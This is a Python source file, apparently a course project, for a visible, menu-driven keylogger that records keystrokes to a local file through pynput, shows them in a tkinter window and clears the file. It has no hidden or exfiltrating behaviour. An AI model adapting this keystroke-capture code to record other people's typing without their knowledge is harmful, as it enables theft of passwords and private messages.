import  tkinter as tk
from    pynput.keyboard     import Listener

#class to display the menu for app
class Menu:
    def __init__(self, title, options):
        self.title      = title
        self.options    = options
    
    #function to display the menu option
    def display_menu(self):
        print(self.title)
        for option in self.options:
            print(option)

#class that has to do with the log file
class Edit_File:
    def __init__(self, file_path):
        self.file_path = file_path

    #function to write to the log file
    def write_to_file(self, key_value):
        with open(self.file_path, 'a') as file:
            file.write(key_value)
        file.close()

    #function to write only char values to the file
    def check_key(self, key):
        try:
            if key.char is not None:
                self.write_to_file(key.char)
        except AttributeError:
            if key.name == 'space':
                self.write_to_file(' ')
            if key.name == 'enter':
                self.write_to_file('\n')

    #function to stop the keylogger when the user is done using it 
    def on_release(self, key):
        try:
            if key.name == 'esc':
                return False
        except AttributeError:
            pass

    #function to view the log file with in a seperate window
    def view_log(self):
        window = tk.Tk()
        window.title('Course Project Log')
        
        text_widget = tk.Text(window, wrap="word", width=80, height=20)
        text_widget.pack(pady=10)

        with open(self.file_path, 'r') as file:
            for line in file:
                text_widget.insert(tk.END, line)
            file.close()

    #function to wipe the log file completely
    def clear_file(self):
        with open(self.file_path, 'w') as file:
            pass
            file.close()

class App(Menu, Edit_File):
    def __init__(self, title, options, file_path):
        Menu.__init__(self, title, options)
        Edit_File.__init__(self, file_path)

    def main(self):
        #loop the menu until the user is done with app
        while True:
            self.display_menu()
            choice = input('Choose an option(1-4): ').strip()
            print('\n')

            #determine what the user picked and output the right function to the choice
            if choice == '1':
                with Listener(on_press=self.check_key, on_release=self.on_release) as listener:
                    print('To exit the key logger press the ESC key\n')
                    listener.join()
            elif choice == '2':
                self.view_log()
            elif choice == '3':
                self.clear_file()
            elif choice == '4':
                print('Goodbye!')
                break
            else:
                print('Your choice \'{}\' is an invalid option. Try again.\n'.format(choice))
